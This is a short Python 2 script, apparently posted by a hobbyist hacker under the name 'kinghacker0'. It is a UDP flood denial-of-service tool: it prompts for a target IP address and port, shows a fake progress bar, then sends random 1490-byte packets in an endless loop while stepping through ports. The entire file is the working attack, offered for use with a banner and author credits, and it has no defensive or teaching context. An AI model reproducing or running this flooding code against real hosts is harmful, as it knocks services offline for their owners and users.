#Copy this code doesn't make you programmer bro!

import sys
import os
import time
import socket
import random
#Code
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

#Banner Start
print " ___/__ \______ ___ / /____/ /_ "
print "__  /_/ /_  __ `/_  __/__  __ |"
print "_  _, _/ / /_/ / / /_  _  / / /"
print "/_/ |_|  \__,_/  \__/  /_/ /_/ "

#Banner End

print
print "Author    : kinghacker0"
print "Github    : https://github.com/kinghacker0"
print "Instagram : https://www.instagram.com/kinghacker0"
print

ip = raw_input("[*]Enter Target Ip : ")
port = int(raw_input("[*]Enter Target Port : "))

time.sleep(3)
print "[-------->           ] 45%"
time.sleep(3)
print "[------------>       ] 55%"
time.sleep(3)
print "[------------------->] 100%"
time.sleep(5)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

#Credit - github.com/kinghacker0
